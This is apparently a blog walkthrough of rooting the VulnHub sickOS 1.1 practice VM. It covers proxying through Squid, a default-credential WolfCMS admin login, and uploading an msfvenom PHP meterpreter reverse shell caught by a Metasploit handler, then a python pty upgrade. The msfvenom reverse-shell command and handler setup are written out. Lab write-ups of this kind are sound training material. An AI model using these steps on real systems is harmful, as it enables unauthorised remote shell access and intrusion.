Hey everyone, today we have a VulnHub VM, <a href="https://www.vulnhub.com/entry/sickos-11,132/">sickOS</a>, that we are going to get root on. 

The description given is "This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them."

Being similar to an OSCP is nice to know! Let's get started.

Here is what you see when you power on the sickOS VM. So as always, let's move over to our Kali machine and nmap the network and find sickOS's IP.

We've got ports  22 and 3128 open and port 8080 closed. Let's launch firefox and see what happens if we go to the IP address.

Connection timed out, that's no good. Let's try to proxy using the squid-http open port and refresh.

Well that's seemed to work. So squid is running on this server. 

Okay, let's use Nikto to find out if we've got any vulnerabilities we can use!

Okay! There are a few exploits we could use, shellshock looks especially interesting! But first I'm going to look at the robots.txt

![wolfcms](/assets/sickos/wolfcms.PNG){: .center-image }

There's mention of a "wolfcms", let's see if that comes up for us.

WolfCMS is a Content Management System, neat. With Content Management must come an administrator login right? Let's head over to DuckDuckGo and find out how to log in to WolfCMS.

Appending /?admin/ works, now we could try find a way to crack this login <u><i>OR</i></u> we could try the handy "admin" "password" or "admin" "admin" before we get ahead of ourselves.

![wolfcms admin](/assets/sickos/wolfcmsadmin.PNG){: .center-image }

Yep, admin admin strikes again. Thanks lazy admins! Let's go to the files tab and hope we can upload some files.

![wolfcms files](/assets/sickos/wolfcms_files.PNG){: .center-image }

It seems like it's letting us do it, let's upload a php script to try get a reverse shell going. First, we need to make the php script with MSFvenom

Using:

{% highlight ruby %}
msfvenom -p php/meterpreter/reverse_tcp lhost=**HOST IP ADDRESS** lport=**whichever port you want** -f raw
{% endhighlight %}

we can make a php script to open a reverse tcp to get us in to open a reverse shell.

Now that we've got the php file uploaded, we need to make a session on our Kali box so when we activate it on the web server, it handshakes and we can make our reverse shell. 

We are making a session in Metasploit, using the exploit/multi/handler and using the php/meterpreter/reverse_tcp (as before when making the script) specifying the same host and port we specified in the php script!

Now we go to the web server where our php script is located and run it! 

![metasploit session](/assets/sickos/metasploit_session.PNG){: .center-image }

The session has started!! Let's use a nifty python trick and get into bash on the web server.

{% highlight ruby %}
echo "import pty; pty.spawn('/bin/bash')" > /tmp/aaaa.py
python /tmp/aaaa.py
{% endhighlight %}


![bash shell](/assets/sickos/bash_shell.PNG){: .center-image }

We have bash! much easier to work with. 

![file list](/assets/sickos/filelist.PNG){: .center-image }

Our user is www-data and I've now changed directory and listed the files, config.php looks like the most interesting file at the moment so I'll cat into that and have a read

![sql username pass](/assets/sickos/sqlusernamepass.PNG){: .center-image }

And straight away we have a password, let's try and get into the account!

![loggedin sickos](/assets/sickos/loggedinsickos.PNG){: .center-image }

Okay, now finally let's get root and show the flag!

![root](/assets/sickos/root.PNG){: .center-image }

Thanks guys, three machines down! I'll try get another post out within a week or so!
